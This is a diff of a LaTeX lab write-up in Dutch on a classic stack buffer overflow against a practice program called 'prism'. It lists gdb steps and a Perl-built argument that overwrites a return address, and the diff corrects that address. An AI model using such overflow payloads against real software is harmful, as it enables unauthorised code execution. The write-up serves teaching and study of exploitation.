@@ -1,4 +1,5 @@
 \begin{enumerate}
+  \item disass gegevens is gegeven: 0x08048481
   \item gcc-3.3 -o prism prism.c
   \item gdb -q prism 
   \item (gdb) list
@@ -26,7 +27,7 @@
   	\end{enumerate}
   \item Trial and error
   	\begin{enumerate}
-  	\item (gdb) run ``maaktnietuit'' ``\$(perl -e `print ``\textbackslash{}x91\textbackslash{}x84\textbackslash{}x04\textbackslash{}x08''x2')''
+  	\item (gdb) run ``maaktnietuit'' ``\$(perl -e `print ``\textbackslash{}x81\textbackslash{}x84\textbackslash{}x04\textbackslash{}x08''x2')''
   		\begin{enumerate}
   		\item Program exited normally
   		\end{enumerate}
@@ -34,12 +35,12 @@
   		\begin{enumerate}
   		\item Segmentation fault
   		\end{enumerate}
-  	\item (gdb) run ``maaktnietuit'' ``\$(perl -e `print ``\textbackslash{}x91\textbackslash{}x84\textbackslash{}x04\textbackslash{}x08''x4')''
+  	\item (gdb) run ``maaktnietuit'' ``\$(perl -e `print ``\textbackslash{}x81\textbackslash{}x84\textbackslash{}x04\textbackslash{}x08''x4')''
   		\begin{enumerate}
   		\item Succes!
   		\end{enumerate}
   	\end{enumerate}
-  \item ./prism ``maaktnietuit'' ``\$(perl -e `print ``\textbackslash{}x91\textbackslash{}x84\textbackslash{}x04\textbackslash{}x08''x4')''
+  \item ./prism ``maaktnietuit'' ``\$(perl -e `print ``\textbackslash{}x81\textbackslash{}x84\textbackslash{}x04\textbackslash{}x08''x4')''
 \end{enumerate}
 
 \begin{lstlisting}
